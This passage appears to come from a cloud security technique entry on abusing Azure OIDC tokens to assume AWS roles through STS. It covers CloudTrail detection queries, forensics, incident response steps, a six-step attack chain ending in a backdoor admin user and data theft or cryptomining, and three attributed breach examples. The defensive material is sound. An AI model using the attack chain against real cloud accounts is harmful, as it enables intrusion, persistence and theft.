  - Same principal accessing cross-account resources

### Forensic Artifacts

- **CloudTrail Logs:**
  - Search for `eventName:"AssumeRoleWithWebIdentity"` AND `userIdentity.principalId:*oidc*`
  - Timeline: when Azure token was issued vs when AWS role was assumed
  - IP addresses: correlate Azure source IP with AWS CloudTrail source IP

- **AWS Logs:**
  - Check for newly created IAM users/access keys from assumed role sessions
  - Review attached policies on compromised account
  - Check S3 bucket access logs for data exfiltration

### Response Procedures

**Immediate (0-1 hour):**
1. **Identify compromised role:** Search CloudTrail for AssumeRoleWithWebIdentity
2. **Revoke OIDC provider:** Delete OIDC provider from AWS IAM
3. **Rotate credentials:** Generate new OIDC provider thumbprints
4. **Invalidate sessions:** Delete assumed role sessions or rotate role keys

**Short-term (1-8 hours):**
1. **Audit permissions:** Review what was accessed during compromised role session
2. **Restore trust policy:** Implement ExternalID and MFA requirements
3. **Review forensics:** Check S3 and database access logs

**Long-term (8+ hours):**
1. **Implement detection:** Deploy Sentinel/CloudTrail rules for future attacks
2. **Update security baselines:** Enforce ExternalID on all federated roles
3. **Hunt:** Search for similar patterns across organization

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Phish Azure credentials or compromise Azure VM |
| **2** | **Credential Access** | [CA-TOKEN-018](./CA-TOKEN-018_Cloud2Cloud.md) | Extract Azure OIDC token from IMDS |
| **3** | **Current Step** | **[CA-TOKEN-019]** | **AWS STS Token Abuse via Azure** |
| **4** | **Privilege Escalation** | Cross-account role assumption | Chain AWS STS calls across multiple accounts |
| **5** | **Persistence** | IAM user creation with AdministratorAccess | Create backdoor AWS user |
| **6** | **Impact** | Data exfiltration or cryptomining | Access S3, RDS, or deploy Lambda crypto |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Azure-to-AWS Lateral Movement (2024)

- **Target:** Multi-cloud SaaS company with Azure and AWS infrastructure
- **Timeline:** Post-compromise via Azure VM exploit
- **Technique Status:** Attacker compromised Azure VM, extracted OIDC token, assumed misconfigured AWS role lacking ExternalID
- **Impact:** Accessed AWS production S3 buckets containing customer data; exfiltrated 50GB+ of sensitive information
- **Reference:** [Unit42 Cloud Lateral Movement Report](https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/)

### Example 2: CI/CD Pipeline Token Exchange (2023)

- **Target:** Software development company using Azure DevOps for CI/CD
- **Timeline:** Attacker compromised Azure Pipelines service connection
- **Technique Status:** Exploited OIDC token exchange without ExternalID validation; assumed AWS Lambda execution role
- **Impact:** Deployed cryptominer to AWS Lambda; generated $15,000+ in AWS costs before detection
- **Reference:** [AWS Security Blog - Token-Based Lateral Movement](https://aws.amazon.com/blogs/)

### Example 3: Scattered Spider Campaign (2024)

- **Target:** Enterprise organizations with hybrid Azure/AWS
- **Timeline:** Ongoing social engineering + credential theft
- **Technique Status:** After gaining Azure credentials via phishing, attackers stole OIDC tokens and used them to assume AWS roles
- **Impact:** Lateral movement across cloud boundaries; access to production databases and backup systems
- **Reference:** [CrowdStrike Intelligence - Scattered Spider](https://www.crowdstrike.com/blog/)

---